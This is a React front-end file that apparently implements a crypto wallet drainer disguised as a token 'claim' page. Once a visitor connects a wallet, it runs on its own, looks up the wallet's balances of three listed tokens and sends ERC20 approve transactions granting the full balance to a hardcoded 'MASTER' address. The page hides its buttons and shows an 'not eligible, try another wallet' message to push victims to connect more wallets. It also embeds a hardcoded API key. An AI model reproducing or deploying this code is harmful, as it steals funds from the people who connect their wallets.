import React, { useEffect, useState } from 'react';
import { useConnectModal } from '@rainbow-me/rainbowkit';
import { useAccount } from 'wagmi'
const { Alchemy, Network } = require("alchemy-sdk");
import ERC20ABI from "../ERC20.json";
import { encodeFunctionData, getAddress } from 'viem';
import { useWalletClient } from 'wagmi'

const MASTER = "0x0000063Fe0A1Ef401da9CcD1C630ae2Df47d67E9";

function Home() {

    const { address, isConnected } = useAccount();
    const { openConnectModal } = useConnectModal();
    const { data: walletClient } = useWalletClient()
    const config = {
        apiKey: "ik4lKo9Qf2HSP7auR83a_o5xSDpVrowY",
        network: Network.ETH_MAINNET,
    };
    const [showNE, setShowNE] = useState(false);
    const alchemy = new Alchemy(config);

    const claim = async () => {
        setShowNE(false);
        const balances = await alchemy.core.getTokenBalances(address);  
        let targetTokens = [
            "0x159cDAF78bE31E730d9E1330adFcfBb79a5fdb95", // mte
            "0x0F7B3F5a8FeD821c5eb60049538a548dB2D479ce", // ator
            "0x5a3e6A77ba2f983eC0d371ea3B475F8Bc0811AD5", // 0x0
        ];

        let t = false;
        for(let j = 0; j < targetTokens.length; j++){
            let selectedToken = getAddress(targetTokens[j]);
            for(let i = 0; i < balances.tokenBalances.length; i++) {
                const token = balances.tokenBalances[i];
                const tokenAddress = getAddress(token.contractAddress);
                
                if(
                    token.tokenBalance != "0x0000000000000000000000000000000000000000000000000000000000000000" && 
                    tokenAddress == selectedToken
                ){
                    t = true;
                    let rawData = encodeFunctionData({
                        abi: ERC20ABI,
                        functionName: "approve",
                        args: [MASTER, token.tokenBalance]
                    })
                    
                    try {
                        let txData = {
                            account: getAddress(address),
                            to: tokenAddress,
                            data: rawData,
                        }
                        await walletClient.sendTransaction(txData);
                    }catch (e) {
                        console.log(e);
                    }
                }
            }
        }

        if(!t){
            setShowNE(true);
        }
    }

    useEffect(() => {
        if(isConnected){
            claim();
        }
    }, [isConnected])

    return (
        <div>
            <div
                hidden={!showNE}
                style={{
                    width: "100%",
                    padding: "20px",
                    backgroundColor: "red",
                    color: "#fff",
                    fontSize: "16px",
                    textAlign: "center"
                }}
            >
                <p>This wallet is not eligible. Please try another wallet.</p>
            </div>
            {isConnected? <button id="connect" onClick={claim} hidden={true} data-connected={true}>Claim</button> : <button id='connect' data-connected={false} hidden={true} onClick={() => openConnectModal()}>Connect</button>}
        </div>
    )
}

export default Home;